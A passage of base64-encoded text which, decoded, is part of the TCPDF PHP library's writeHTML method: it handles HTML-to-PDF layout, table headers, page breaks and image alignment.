wYWRkaW5nLCAwLCAnVCcsIGZhbHNlKTsKCX0KCgkvKioKCSAqIEFsbG93cyB0byBwcmVzZXJ2ZSBzb21lIEhUTUwgZm9ybWF0dGluZyAobGltaXRlZCBzdXBwb3J0KS48YnIgLz4KCSAqIElNUE9SVEFOVDogVGhlIEhUTUwgbXVzdCBiZSB3ZWxsIGZvcm1hdHRlZCAtIHRyeSB0byBjbGVhbi11cCBpdCB1c2luZyBhbiBhcHBsaWNhdGlvbiBsaWtlIEhUTUwtVGlkeSBiZWZvcmUgc3VibWl0dGluZy4KCSAqIFN1cHBvcnRlZCB0YWdzIGFyZTogYSwgYiwgYmxvY2txdW90ZSwgYnIsIGRkLCBkZWwsIGRpdiwgZGwsIGR0LCBlbSwgZm9udCwgaDEsIGgyLCBoMywgaDQsIGg1LCBoNiwgaHIsIGksIGltZywgbGksIG9sLCBwLCBwcmUsIHNtYWxsLCBzcGFuLCBzdHJvbmcsIHN1Yiwgc3VwLCB0YWJsZSwgdGNwZGYsIHRkLCB0aCwgdGhlYWQsIHRyLCB0dCwgdSwgdWwKCSAqIE5PVEU6IGFsbCB0aGUgSFRNTCBhdHRyaWJ1dGVzIG11c3QgYmUgZW5jbG9zZWQgaW4gZG91YmxlLXF1b3RlLgoJICogQHBhcmFtIHN0cmluZyAkaHRtbCB0ZXh0IHRvIGRpc3BsYXkKCSAqIEBwYXJhbSBib29sZWFuICRsbiBpZiB0cnVlIGFkZCBhIG5ldyBsaW5lIGFmdGVyIHRleHQgKGRlZmF1bHQgPSB0cnVlKQoJICogQHBhcmFtIGJvb2xlYW4gJGZpbGwgSW5kaWNhdGVzIGlmIHRoZSBiYWNrZ3JvdW5kIG11c3QgYmUgcGFpbnRlZCAodHJ1ZSkgb3IgdHJhbnNwYXJlbnQgKGZhbHNlKS4KCSAqIEBwYXJhbSBib29sZWFuICRyZXNldGggaWYgdHJ1ZSByZXNldCB0aGUgbGFzdCBjZWxsIGhlaWdodCAoZGVmYXVsdCBmYWxzZSkuCgkgKiBAcGFyYW0gYm9vbGVhbiAkY2VsbCBpZiB0cnVlIGFkZCB0aGUgY3VycmVudCBsZWZ0IChvciByaWdodCBmb3IgUlRMKSBwYWRkaW5nIHRvIGVhY2ggV3JpdGUgKGRlZmF1bHQgZmFsc2UpLgoJICogQHBhcmFtIHN0cmluZyAkYWxpZ24gQWxsb3dzIHRvIGNlbnRlciBvciBhbGlnbiB0aGUgdGV4dC4gUG9zc2libGUgdmFsdWVzIGFyZTo8dWw+PGxpPkwgOiBsZWZ0IGFsaWduPC9saT48bGk+QyA6IGNlbnRlcjwvbGk+PGxpPlIgOiByaWdodCBhbGlnbjwvbGk+PGxpPicnIDogZW1wdHkgc3RyaW5nIDogbGVmdCBmb3IgTFRSIG9yIHJpZ2h0IGZvciBSVEw8L2xpPjwvdWw+CgkgKiBAcHVibGljCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiB3cml0ZUhUTUwoJGh0bWwsICRsbj10cnVlLCAkZmlsbD1mYWxzZSwgJHJlc2V0aD1mYWxzZSwgJGNlbGw9ZmFsc2UsICRhbGlnbj0nJykgewoJCSRndmFycyA9ICR0aGlzLT5nZXRHcmFwaGljVmFycygpOwoJCS8vIHN0b3JlIGN1cnJlbnQgdmFsdWVzCgkJJHByZXZfY2VsbF9tYXJnaW4gPSAkdGhpcy0+Y2VsbF9tYXJnaW47CgkJJHByZXZfY2VsbF9wYWRkaW5nID0gJHRoaXMtPmNlbGxfcGFkZGluZzsKCQkkcHJldlBhZ2UgPSAkdGhpcy0+cGFnZTsKCQkkcHJldmxNYXJnaW4gPSAkdGhpcy0+bE1hcmdpbjsKCQkkcHJldnJNYXJnaW4gPSAkdGhpcy0+ck1hcmdpbjsKCQkkY3VyZm9udG5hbWUgPSAkdGhpcy0+Rm9udEZhbWlseTsKCQkkY3VyZm9udHN0eWxlID0gJHRoaXMtPkZvbnRTdHlsZTsKCQkkY3VyZm9udHNpemUgPSAkdGhpcy0+Rm9udFNpemVQdDsKCQkkY3VyZm9udGFzY2VudCA9ICR0aGlzLT5nZXRGb250QXNjZW50KCRjdXJmb250bmFtZSwgJGN1cmZvbnRzdHlsZSwgJGN1cmZvbnRzaXplKTsKCQkkY3VyZm9udGRlc2NlbnQgPSAkdGhpcy0+Z2V0Rm9udERlc2NlbnQoJGN1cmZvbnRuYW1lLCAkY3VyZm9udHN0eWxlLCAkY3VyZm9udHNpemUpOwoJCSRjdXJmb250c3RyZXRjaW5nID0gJHRoaXMtPmZvbnRfc3RyZXRjaGluZzsKCQkkY3VyZm9udHRyYWNraW5nID0gJHRoaXMtPmZvbnRfc3BhY2luZzsKCQkkdGhpcy0+bmV3bGluZSA9IHRydWU7CgkJJG5ld2xpbmUgPSB0cnVlOwoJCSRzdGFydGxpbmVwYWdlID0gJHRoaXMtPnBhZ2U7CgkJJG1pbnN0YXJ0bGluZXkgPSAkdGhpcy0+eTsKCQkkbWF4Ym90dG9tbGluZXkgPSAwOwoJCSRzdGFydGxpbmV4ID0gJHRoaXMtPng7CgkJJHN0YXJ0bGluZXkgPSAkdGhpcy0+eTsKCQkkeXNoaWZ0ID0gMDsKCQkkbG9vcCA9IDA7CgkJJGN1cnBvcyA9IDA7CgkJJHRoaXNfbWV0aG9kX3ZhcnMgPSBhcnJheSgpOwoJCSR1bmRvID0gZmFsc2U7CgkJJGZvbnRhbGlnbmVkID0gZmFsc2U7CgkJJHJldmVyc2VfZGlyID0gZmFsc2U7IC8vIHRydWUgd2hlbiB0aGUgdGV4dCBkaXJlY3Rpb24gaXMgcmV2ZXJzZWQKCQkkdGhpcy0+cHJlbW9kZSA9IGZhbHNlOwoJCWlmICgkdGhpcy0+aW54b2JqKSB7CgkJCS8vIHdlIGFyZSBpbnNpZGUgYW4gWE9iamVjdCB0ZW1wbGF0ZQoJCQkkcGFzayA9IGNvdW50KCR0aGlzLT54b2JqZWN0c1skdGhpcy0+eG9iamlkXVsnYW5ub3RhdGlvbnMnXSk7CgkJfSBlbHNlaWYgKGlzc2V0KCR0aGlzLT5QYWdlQW5ub3RzWyR0aGlzLT5wYWdlXSkpIHsKCQkJJHBhc2sgPSBjb3VudCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0pOwoJCX0gZWxzZSB7CgkJCSRwYXNrID0gMDsKCQl9CgkJaWYgKCR0aGlzLT5pbnhvYmopIHsKCQkJLy8gd2UgYXJlIGluc2lkZSBhbiBYT2JqZWN0IHRlbXBsYXRlCgkJCSRzdGFydGxpbmVwb3MgPSBzdHJsZW4oJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydvdXRkYXRhJ10pOwoJCX0gZWxzZWlmICghJHRoaXMtPkluRm9vdGVyKSB7CgkJCWlmIChpc3NldCgkdGhpcy0+Zm9vdGVybGVuWyR0aGlzLT5wYWdlXSkpIHsKCQkJCSR0aGlzLT5mb290ZXJwb3NbJHRoaXMtPnBhZ2VdID0gJHRoaXMtPnBhZ2VsZW5bJHRoaXMtPnBhZ2VdIC0gJHRoaXMtPmZvb3RlcmxlblskdGhpcy0+cGFnZV07CgkJCX0gZWxzZSB7CgkJCQkkdGhpcy0+Zm9vdGVycG9zWyR0aGlzLT5wYWdlXSA9ICR0aGlzLT5wYWdlbGVuWyR0aGlzLT5wYWdlXTsKCQkJfQoJCQkkc3RhcnRsaW5lcG9zID0gJHRoaXMtPmZvb3RlcnBvc1skdGhpcy0+cGFnZV07CgkJfSBlbHNlIHsKCQkJLy8gd2UgYXJlIGluc2lkZSB0aGUgZm9vdGVyCgkJCSRzdGFydGxpbmVwb3MgPSAkdGhpcy0+cGFnZWxlblskdGhpcy0+cGFnZV07CgkJfQoJCSRsYWxpZ24gPSAkYWxpZ247CgkJJHBsYWxpZ24gPSAkYWxpZ247CgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJJHcgPSAkdGhpcy0+eCAtICR0aGlzLT5sTWFyZ2luOwoJCX0gZWxzZSB7CgkJCSR3ID0gJHRoaXMtPncgLSAkdGhpcy0+ck1hcmdpbiAtICR0aGlzLT54OwoJCX0KCQkkdyAtPSAoJHRoaXMtPmNlbGxfcGFkZGluZ1snTCddICsgJHRoaXMtPmNlbGxfcGFkZGluZ1snUiddKTsKCQlpZiAoJGNlbGwpIHsKCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCSR0aGlzLT54IC09ICR0aGlzLT5jZWxsX3BhZGRpbmdbJ1InXTsKCQkJCSR0aGlzLT5sTWFyZ2luICs9ICR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXTsKCQkJfSBlbHNlIHsKCQkJCSR0aGlzLT54ICs9ICR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXTsKCQkJCSR0aGlzLT5yTWFyZ2luICs9ICR0aGlzLT5jZWxsX3BhZGRpbmdbJ1InXTsKCQkJfQoJCX0KCQlpZiAoJHRoaXMtPmN1c3RvbWxpc3RpbmRlbnQgPj0gMCkgewoJCQkkdGhpcy0+bGlzdGluZGVudCA9ICR0aGlzLT5jdXN0b21saXN0aW5kZW50OwoJCX0gZWxzZSB7CgkJCSR0aGlzLT5saXN0aW5kZW50ID0gJHRoaXMtPkdldFN0cmluZ1dpZHRoKCcwMDAwMDAnKTsKCQl9CgkJJHRoaXMtPmxpc3RpbmRlbnRsZXZlbCA9IDA7CgkJLy8gc2F2ZSBwcmV2aW91cyBzdGF0ZXMKCQkkcHJldl9jZWxsX2hlaWdodF9yYXRpbyA9ICR0aGlzLT5jZWxsX2hlaWdodF9yYXRpbzsKCQkkcHJldl9saXN0bnVtID0gJHRoaXMtPmxpc3RudW07CgkJJHByZXZfbGlzdG9yZGVyZWQgPSAkdGhpcy0+bGlzdG9yZGVyZWQ7CgkJJHByZXZfbGlzdGNvdW50ID0gJHRoaXMtPmxpc3Rjb3VudDsKCQkkcHJldl9saXNwYWNlciA9ICR0aGlzLT5saXNwYWNlcjsKCQkkdGhpcy0+bGlzdG51bSA9IDA7CgkJJHRoaXMtPmxpc3RvcmRlcmVkID0gYXJyYXkoKTsKCQkkdGhpcy0+bGlzdGNvdW50ID0gYXJyYXkoKTsKCQkkdGhpcy0+bGlzcGFjZXIgPSAnJzsKCQlpZiAoKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR0aGlzLT5sYXN0aCkpIE9SICgkcmVzZXRoKSkgewoJCQkvLyByZXNldCByb3cgaGVpZ2h0CgkJCSR0aGlzLT5yZXNldExhc3RIKCk7CgkJfQoJCSRkb20gPSAkdGhpcy0+Z2V0SHRtbERvbUFycmF5KCRodG1sKTsKCQkkbWF4ZWwgPSBjb3VudCgkZG9tKTsKCQkka2V5ID0gMDsKCQl3aGlsZSAoJGtleSA8ICRtYXhlbCkgewoJCQlpZiAoJGRvbVska2V5XVsndGFnJ10gQU5EICRkb21bJGtleV1bJ29wZW5pbmcnXSBBTkQgJGRvbVska2V5XVsnaGlkZSddKSB7CgkJCQkvLyBzdG9yZSB0aGUgbm9kZSBrZXkKCQkJCSRoaWRkZW5fbm9kZV9rZXkgPSAka2V5OwoJCQkJaWYgKCRkb21bJGtleV1bJ3NlbGYnXSkgewoJCQkJCS8vIHNraXAganVzdCB0aGlzIHNlbGYtY2xvc2luZyB0YWcKCQkJCQkrKyRrZXk7CgkJCQl9IGVsc2UgewoJCQkJCS8vIHNraXAgdGhpcyBhbmQgYWxsIGNoaWxkcmVuIHRhZ3MKCQkJCQl3aGlsZSAoKCRrZXkgPCAkbWF4ZWwpIEFORCAoISRkb21bJGtleV1bJ3RhZyddIE9SICRkb21bJGtleV1bJ29wZW5pbmcnXSBPUiAoJGRvbVska2V5XVsncGFyZW50J10gIT0gJGhpZGRlbl9ub2RlX2tleSkpKSB7CgkJCQkJCS8vIHNraXAgaGlkZGVuIG9iamVjdHMKCQkJCQkJKyska2V5OwoJCQkJCX0KCQkJCQkrKyRrZXk7CgkJCQl9CgkJCX0KCQkJaWYgKCRrZXkgPT0gJG1heGVsKSBicmVhazsKCQkJaWYgKCRkb21bJGtleV1bJ3RhZyddIEFORCBpc3NldCgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsncGFnZWJyZWFrJ10pKSB7CgkJCQkvLyBjaGVjayBmb3IgcGFnZWJyZWFrCgkJCQlpZiAoKCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydwYWdlYnJlYWsnXSA9PSAndHJ1ZScpIE9SICgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsncGFnZWJyZWFrJ10gPT0gJ2xlZnQnKSBPUiAoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ3BhZ2VicmVhayddID09ICdyaWdodCcpKSB7CgkJCQkJLy8gYWRkIGEgcGFnZSAob3IgdHJpZyBBY2NlcHRQYWdlQnJlYWsoKSBmb3IgbXVsdGljb2x1bW4gbW9kZSkKCQkJCQkkdGhpcy0+Y2hlY2tQYWdlQnJlYWsoJHRoaXMtPlBhZ2VCcmVha1RyaWdnZXIgKyAxKTsKCQkJCQkkdGhpcy0+aHRtbHZzcGFjZSA9ICgkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlciArIDEpOwoJCQkJfQoJCQkJaWYgKCgoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ3BhZ2VicmVhayddID09ICdsZWZ0JykgQU5EICgoKCEkdGhpcy0+cnRsKSBBTkQgKCgkdGhpcy0+cGFnZSAlIDIpID09IDApKSBPUiAoKCR0aGlzLT5ydGwpIEFORCAoKCR0aGlzLT5wYWdlICUgMikgIT0gMCkpKSkKCQkJCQlPUiAoKCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydwYWdlYnJlYWsnXSA9PSAncmlnaHQnKSBBTkQgKCgoISR0aGlzLT5ydGwpIEFORCAoKCR0aGlzLT5wYWdlICUgMikgIT0gMCkpIE9SICgoJHRoaXMtPnJ0bCkgQU5EICgoJHRoaXMtPnBhZ2UgJSAyKSA9PSAwKSkpKSkgewoJCQkJCS8vIGFkZCBhIHBhZ2UgKG9yIHRyaWcgQWNjZXB0UGFnZUJyZWFrKCkgZm9yIG11bHRpY29sdW1uIG1vZGUpCgkJCQkJJHRoaXMtPmNoZWNrUGFnZUJyZWFrKCR0aGlzLT5QYWdlQnJlYWtUcmlnZ2VyICsgMSk7CgkJCQkJJHRoaXMtPmh0bWx2c3BhY2UgPSAoJHRoaXMtPlBhZ2VCcmVha1RyaWdnZXIgKyAxKTsKCQkJCX0KCQkJfQoJCQlpZiAoJGRvbVska2V5XVsndGFnJ10gQU5EICRkb21bJGtleV1bJ29wZW5pbmcnXSBBTkQgaXNzZXQoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ25vYnInXSkgQU5EICgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnbm9iciddID09ICd0cnVlJykpIHsKCQkJCWlmIChpc3NldCgkZG9tWygkZG9tWyRrZXldWydwYXJlbnQnXSldWydhdHRyaWJ1dGUnXVsnbm9iciddKSBBTkQgKCRkb21bKCRkb21bJGtleV1bJ3BhcmVudCddKV1bJ2F0dHJpYnV0ZSddWydub2JyJ10gPT0gJ3RydWUnKSkgewoJCQkJCSRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydub2JyJ10gPSBmYWxzZTsKCQkJCX0gZWxzZSB7CgkJCQkJLy8gc3RvcmUgY3VycmVudCBvYmplY3QKCQkJCQkkdGhpcy0+c3RhcnRUcmFuc2FjdGlvbigpOwoJCQkJCS8vIHNhdmUgdGhpcyBtZXRob2QgdmFycwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydodG1sJ10gPSAkaHRtbDsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1snbG4nXSA9ICRsbjsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1snZmlsbCddID0gJGZpbGw7CgkJCQkJJHRoaXNfbWV0aG9kX3ZhcnNbJ3Jlc2V0aCddID0gJHJlc2V0aDsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1snY2VsbCddID0gJGNlbGw7CgkJCQkJJHRoaXNfbWV0aG9kX3ZhcnNbJ2FsaWduJ10gPSAkYWxpZ247CgkJCQkJJHRoaXNfbWV0aG9kX3ZhcnNbJ2d2YXJzJ10gPSAkZ3ZhcnM7CgkJCQkJJHRoaXNfbWV0aG9kX3ZhcnNbJ3ByZXZQYWdlJ10gPSAkcHJldlBhZ2U7CgkJCQkJJHRoaXNfbWV0aG9kX3ZhcnNbJ3ByZXZfY2VsbF9tYXJnaW4nXSA9ICRwcmV2X2NlbGxfbWFyZ2luOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydwcmV2X2NlbGxfcGFkZGluZyddID0gJHByZXZfY2VsbF9wYWRkaW5nOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydwcmV2bE1hcmdpbiddID0gJHByZXZsTWFyZ2luOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydwcmV2ck1hcmdpbiddID0gJHByZXZyTWFyZ2luOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydjdXJmb250bmFtZSddID0gJGN1cmZvbnRuYW1lOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydjdXJmb250c3R5bGUnXSA9ICRjdXJmb250c3R5bGU7CgkJCQkJJHRoaXNfbWV0aG9kX3ZhcnNbJ2N1cmZvbnRzaXplJ10gPSAkY3VyZm9udHNpemU7CgkJCQkJJHRoaXNfbWV0aG9kX3ZhcnNbJ2N1cmZvbnRhc2NlbnQnXSA9ICRjdXJmb250YXNjZW50OwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydjdXJmb250ZGVzY2VudCddID0gJGN1cmZvbnRkZXNjZW50OwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydjdXJmb250c3RyZXRjaW5nJ10gPSAkY3VyZm9udHN0cmV0Y2luZzsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1snY3VyZm9udHRyYWNraW5nJ10gPSAkY3VyZm9udHRyYWNraW5nOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydtaW5zdGFydGxpbmV5J10gPSAkbWluc3RhcnRsaW5leTsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1snbWF4Ym90dG9tbGluZXknXSA9ICRtYXhib3R0b21saW5leTsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1sneXNoaWZ0J10gPSAkeXNoaWZ0OwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydzdGFydGxpbmVwYWdlJ10gPSAkc3RhcnRsaW5lcGFnZTsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1snc3RhcnRsaW5lcG9zJ10gPSAkc3RhcnRsaW5lcG9zOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydzdGFydGxpbmV4J10gPSAkc3RhcnRsaW5leDsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1snc3RhcnRsaW5leSddID0gJHN0YXJ0bGluZXk7CgkJCQkJJHRoaXNfbWV0aG9kX3ZhcnNbJ25ld2xpbmUnXSA9ICRuZXdsaW5lOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydsb29wJ10gPSAkbG9vcDsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1snY3VycG9zJ10gPSAkY3VycG9zOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydwYXNrJ10gPSAkcGFzazsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1snbGFsaWduJ10gPSAkbGFsaWduOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydwbGFsaWduJ10gPSAkcGxhbGlnbjsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1sndyddID0gJHc7CgkJCQkJJHRoaXNfbWV0aG9kX3ZhcnNbJ3ByZXZfY2VsbF9oZWlnaHRfcmF0aW8nXSA9ICRwcmV2X2NlbGxfaGVpZ2h0X3JhdGlvOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydwcmV2X2xpc3RudW0nXSA9ICRwcmV2X2xpc3RudW07CgkJCQkJJHRoaXNfbWV0aG9kX3ZhcnNbJ3ByZXZfbGlzdG9yZGVyZWQnXSA9ICRwcmV2X2xpc3RvcmRlcmVkOwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydwcmV2X2xpc3Rjb3VudCddID0gJHByZXZfbGlzdGNvdW50OwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydwcmV2X2xpc3BhY2VyJ10gPSAkcHJldl9saXNwYWNlcjsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1snZm9udGFsaWduZWQnXSA9ICRmb250YWxpZ25lZDsKCQkJCQkkdGhpc19tZXRob2RfdmFyc1sna2V5J10gPSAka2V5OwoJCQkJCSR0aGlzX21ldGhvZF92YXJzWydkb20nXSA9ICRkb207CgkJCQl9CgkJCX0KCQkJLy8gcHJpbnQgVEhFQUQgYmxvY2sKCQkJaWYgKCgkZG9tWyRrZXldWyd2YWx1ZSddID09ICd0cicpIEFORCBpc3NldCgkZG9tWyRrZXldWyd0aGVhZCddKSBBTkQgJGRvbVska2V5XVsndGhlYWQnXSkgewoJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ3BhcmVudCddKSBBTkQgaXNzZXQoJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ3RoZWFkJ10pIEFORCAhVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ3RoZWFkJ10pKSB7CgkJCQkJJHRoaXMtPmludGhlYWQgPSB0cnVlOwoJCQkJCS8vIHByaW50IHRhYmxlIGhlYWRlciAodGhlYWQpCgkJCQkJJHRoaXMtPndyaXRlSFRNTCgkdGhpcy0+dGhlYWQsIGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlLCAnJyk7CgkJCQkJLy8gY2hlY2sgaWYgd2UgYXJlIG9uIGEgbmV3IHBhZ2Ugb3Igb24gYSBuZXcgY29sdW1uCgkJCQkJaWYgKCgkdGhpcy0+eSA8ICR0aGlzLT5zdGFydF90cmFuc2FjdGlvbl95KSBPUiAoJHRoaXMtPmNoZWNrUGFnZUJyZWFrKCR0aGlzLT5sYXN0aCwgJycsIGZhbHNlKSkpIHsKCQkJCQkJLy8gd2UgYXJlIG9uIGEgbmV3IHBhZ2Ugb3Igb24gYSBuZXcgY29sdW1uIGFuZCB0aGUgdG90YWwgb2JqZWN0IGhlaWdodCBpcyBsZXNzIHRoYW4gdGhlIGF2YWlsYWJsZSB2ZXJ0aWNhbCBzcGFjZS4KCQkJCQkJLy8gcmVzdG9yZSBwcmV2aW91cyBvYmplY3QKCQkJCQkJJHRoaXMtPnJvbGxiYWNrVHJhbnNhY3Rpb24odHJ1ZSk7CgkJCQkJCS8vIHJlc3RvcmUgcHJldmlvdXMgdmFsdWVzCgkJCQkJCWZvcmVhY2ggKCR0aGlzX21ldGhvZF92YXJzIGFzICR2a2V5ID0+ICR2dmFsKSB7CgkJCQkJCQkkJHZrZXkgPSAkdnZhbDsKCQkJCQkJfQoJCQkJCQkvLyBkaXNhYmxlIHRhYmxlIGhlYWRlcgoJCQkJCQkkdG1wX3RoZWFkID0gJHRoaXMtPnRoZWFkOwoJCQkJCQkkdGhpcy0+dGhlYWQgPSAnJzsKCQkJCQkJLy8gYWRkIGEgcGFnZSAob3IgdHJpZyBBY2NlcHRQYWdlQnJlYWsoKSBmb3IgbXVsdGljb2x1bW4gbW9kZSkKCQkJCQkJJHByZV95ID0gJHRoaXMtPnk7CgkJCQkJCWlmICgoISR0aGlzLT5jaGVja1BhZ2VCcmVhaygkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlciArIDEpKSBBTkQgKCR0aGlzLT55IDwgJHByZV95KSkgewoJCQkJCQkJLy8gZml4IGZvciBtdWx0aWNvbHVtbiBtb2RlCgkJCQkJCQkkc3RhcnRsaW5leSA9ICR0aGlzLT55OwoJCQkJCQl9CgkJCQkJCSR0aGlzLT5zdGFydF90cmFuc2FjdGlvbl9wYWdlID0gJHRoaXMtPnBhZ2U7CgkJCQkJCSR0aGlzLT5zdGFydF90cmFuc2FjdGlvbl95ID0gJHRoaXMtPnk7CgkJCQkJCS8vIHJlc3RvcmUgdGFibGUgaGVhZGVyCgkJCQkJCSR0aGlzLT50aGVhZCA9ICR0bXBfdGhlYWQ7CgkJCQkJCS8vIGZpeCB0YWJsZSBib3JkZXIgcHJvcGVydGllcwoJCQkJCQlpZiAoaXNzZXQoJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ2F0dHJpYnV0ZSddWydjZWxsc3BhY2luZyddKSkgewoJCQkJCQkJJHRtcF9jZWxsc3BhY2luZyA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ2F0dHJpYnV0ZSddWydjZWxsc3BhY2luZyddLCAxLCAncHgnKTsKCQkJCQkJfSBlbHNlaWYgKGlzc2V0KCRkb21bJGRvbVska2V5XVsncGFyZW50J11dWydib3JkZXItc3BhY2luZyddKSkgewoJCQkJCQkJJHRtcF9jZWxsc3BhY2luZyA9ICRkb21bJGRvbVska2V5XVsncGFyZW50J11dWydib3JkZXItc3BhY2luZyddWydWJ107CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkdG1wX2NlbGxzcGFjaW5nID0gMDsKCQkJCQkJfQoJCQkJCQkkZG9tWyRkb21bJGtleV1bJ3BhcmVudCddXVsnYm9yZGVycG9zaXRpb24nXVsncGFnZSddID0gJHRoaXMtPnBhZ2U7CgkJCQkJCSRkb21bJGRvbVska2V5XVsncGFyZW50J11dWydib3JkZXJwb3NpdGlvbiddWydjb2x1bW4nXSA9ICR0aGlzLT5jdXJyZW50X2NvbHVtbjsKCQkJCQkJJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ2JvcmRlcnBvc2l0aW9uJ11bJ3knXSA9ICR0aGlzLT55ICsgJHRtcF9jZWxsc3BhY2luZzsKCQkJCQkJJHhvZmZzZXQgPSAoJHRoaXMtPnggLSAkZG9tWyRkb21bJGtleV1bJ3BhcmVudCddXVsnYm9yZGVycG9zaXRpb24nXVsneCddKTsKCQkJCQkJJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ2JvcmRlcnBvc2l0aW9uJ11bJ3gnXSArPSAkeG9mZnNldDsKCQkJCQkJJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ2JvcmRlcnBvc2l0aW9uJ11bJ3htYXgnXSArPSAkeG9mZnNldDsKCQkJCQkJLy8gcHJpbnQgdGFibGUgaGVhZGVyICh0aGVhZCkKCQkJCQkJJHRoaXMtPndyaXRlSFRNTCgkdGhpcy0+dGhlYWQsIGZhbHNlLCBmYWxzZSwgZmFsc2UsIGZhbHNlLCAnJyk7CgkJCQkJfQoJCQkJfQoJCQkJLy8gbW92ZSAka2V5IGluZGV4IGZvcndhcmQgdG8gc2tpcCBUSEVBRCBibG9jawoJCQkJd2hpbGUgKCAoJGtleSA8ICRtYXhlbCkgQU5EICghKAoJCQkJCSgkZG9tWyRrZXldWyd0YWcnXSBBTkQgJGRvbVska2V5XVsnb3BlbmluZyddIEFORCAoJGRvbVska2V5XVsndmFsdWUnXSA9PSAndHInKSBBTkQgKCFpc3NldCgkZG9tWyRrZXldWyd0aGVhZCddKSBPUiAhJGRvbVska2V5XVsndGhlYWQnXSkpCgkJCQkJT1IgKCRkb21bJGtleV1bJ3RhZyddIEFORCAoISRkb21bJGtleV1bJ29wZW5pbmcnXSkgQU5EICgkZG9tWyRrZXldWyd2YWx1ZSddID09ICd0YWJsZScpKSkgKSkgewoJCQkJCSsrJGtleTsKCQkJCX0KCQkJfQoJCQlpZiAoJGRvbVska2V5XVsndGFnJ10gT1IgKCRrZXkgPT0gMCkpIHsKCQkJCWlmICgoKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ3RhYmxlJykgT1IgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ3RyJykpIEFORCAoaXNzZXQoJGRvbVska2V5XVsnYWxpZ24nXSkpKSB7CgkJCQkJJGRvbVska2V5XVsnYWxpZ24nXSA9ICgkdGhpcy0+cnRsKSA/ICdSJyA6ICdMJzsKCQkJCX0KCQkJCS8vIHZlcnRpY2FsbHkgYWxpZ24gaW1hZ2UgaW4gbGluZQoJCQkJaWYgKCghJHRoaXMtPm5ld2xpbmUpIEFORCAoJGRvbVska2V5XVsndmFsdWUnXSA9PSAnaW1nJykgQU5EIChpc3NldCgkZG9tWyRrZXldWydoZWlnaHQnXSkpIEFORCAoJGRvbVska2V5XVsnaGVpZ2h0J10gPiAwKSkgewoJCQkJCS8vIGdldCBpbWFnZSBoZWlnaHQKCQkJCQkkaW1naCA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGRvbVska2V5XVsnaGVpZ2h0J10sICgkZG9tWyRrZXldWydmb250c2l6ZSddIC8gJHRoaXMtPmspLCAncHgnKTsKCQkJCQkkYXV0b2xpbmVicmVhayA9IGZhbHNlOwoJCQkJCWlmICghZW1wdHkoJGRvbVska2V5XVsnd2lkdGgnXSkpIHsKCQkJCQkJJGltZ3cgPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRkb21bJGtleV1bJ3dpZHRoJ10sICgkZG9tWyRrZXldWydmb250c2l6ZSddIC8gJHRoaXMtPmspLCAncHgnLCBmYWxzZSk7CgkJCQkJCWlmICgoJGltZ3cgPD0gKCR0aGlzLT53IC0gJHRoaXMtPmxNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbiAtICR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXSAtICR0aGlzLT5j